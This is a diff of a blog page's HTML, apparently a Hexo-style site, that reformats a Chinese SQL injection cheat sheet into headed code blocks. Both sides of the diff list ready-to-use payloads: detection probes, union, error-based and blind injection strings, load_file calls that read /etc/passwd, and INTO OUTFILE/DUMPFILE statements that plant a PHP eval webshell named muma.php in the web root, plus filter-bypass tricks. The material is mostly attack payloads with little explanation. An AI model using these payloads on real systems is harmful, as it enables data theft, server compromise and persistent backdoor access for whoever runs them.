@@ -86,13 +86,35 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#几种简单的sql注入方式<br>    判断是否存在注入<br>    单引号法     ?id=1’<br>    逻辑法       ?id=1 and 1=1<br>                ?id=1’ and ‘1’=’1<br>    mysql注释符<br>    # //#会被解析为锚，所以要用#的URL编码%23<br>    –空格<br>    /**/<br>##联合查询注入（union slect）<br>    ?id=1 union select 1,2,3</p>
-<p>##报错注入<br>    ?id=1 and updatexml(1,concat(0x7e,version(),0x7e),1)</p>
-<p>##基于布尔的盲注<br>    ?id=1 and length(datebase())&gt;=4</p>
-<p>##基于时间的盲注<br>    ?id=1 and if(length(database())&gt;1,sleep(5),1) //类似于三目运算</p>
-<p>##MySQL读文件<br>    mysql读⽂件是⽤的 load_file() 函数：<br>    select load_file(‘/etc/passwd’);<br>    select load_file(0x2F6574632F706173737764);</p>
-<p>##MySQL写文件<br>    INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符<br>    INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br>    select ‘<?php @eval($_POST[pass])?>‘ into outfile ‘/var/www/html/muma.php’ ;<br>    select ‘<?php @eval($_POST[pass])?>‘ into DUMPFILE ‘/var/www/html/muma.php’ ;<br>    select * from tdb_goods where goods_id=1 into outfile “/var/www/html/muma.php”<br>    LINES STARTING BY ‘<?php @eval($_POST[pass])?>‘<br>    LINES STARTING BY ‘写入的内容’<br>    设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。<br>    LINES TERMINATED BY ‘写入的内容’<br>    设置每行数据结尾的字符，可以为单个或多个字符。默认值是”\n”。</p>
-<p>##绕过的几种方法<br>    大小写绕过<br>    双写绕过<br>    内联注释绕过(/<em>! 语句</em>/)<br>    编码绕过</p>
+        <h1 id="几种简单的sql注入方式"><a href="#几种简单的sql注入方式" class="headerlink" title="几种简单的sql注入方式"></a>几种简单的sql注入方式</h1><pre><code>判断是否存在注入
+单引号法     ?id=1&#39;
+逻辑法       ?id=1 and 1=1
+            ?id=1&#39; and &#39;1&#39;=&#39;1
+mysql注释符
+# //#会被解析为锚，所以要用#的URL编码%23
+--空格
+/**/</code></pre>
+<h2 id="联合查询注入（union-slect）"><a href="#联合查询注入（union-slect）" class="headerlink" title="联合查询注入（union slect）"></a>联合查询注入（union slect）</h2><pre><code>?id=1 union select 1,2,3</code></pre>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><pre><code>?id=1 and updatexml(1,concat(0x7e,version(),0x7e),1)</code></pre>
+<h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><pre><code>?id=1 and length(datebase())&gt;=4</code></pre>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><pre><code>?id=1 and if(length(database())&gt;1,sleep(5),1) //类似于三目运算</code></pre>
+<h2 id="MySQL读文件"><a href="#MySQL读文件" class="headerlink" title="MySQL读文件"></a>MySQL读文件</h2><pre><code>mysql读⽂件是⽤的 load_file() 函数：
+select load_file(&#39;/etc/passwd&#39;);
+select load_file(0x2F6574632F706173737764);</code></pre>
+<h2 id="MySQL写文件"><a href="#MySQL写文件" class="headerlink" title="MySQL写文件"></a>MySQL写文件</h2><pre><code>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符
+INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择
+select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into outfile &#39;/var/www/html/muma.php&#39; ;
+select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;/var/www/html/muma.php&#39; ;
+select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot;
+LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;
+LINES STARTING BY &#39;写入的内容&#39;
+设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。
+LINES TERMINATED BY &#39;写入的内容&#39;
+设置每行数据结尾的字符，可以为单个或多个字符。默认值是&quot;\n&quot;。</code></pre>
+<h2 id="绕过的几种方法"><a href="#绕过的几种方法" class="headerlink" title="绕过的几种方法"></a>绕过的几种方法</h2><pre><code>大小写绕过
+双写绕过
+内联注释绕过(/*! 语句*/)
+编码绕过</code></pre>
 
       
     </div>
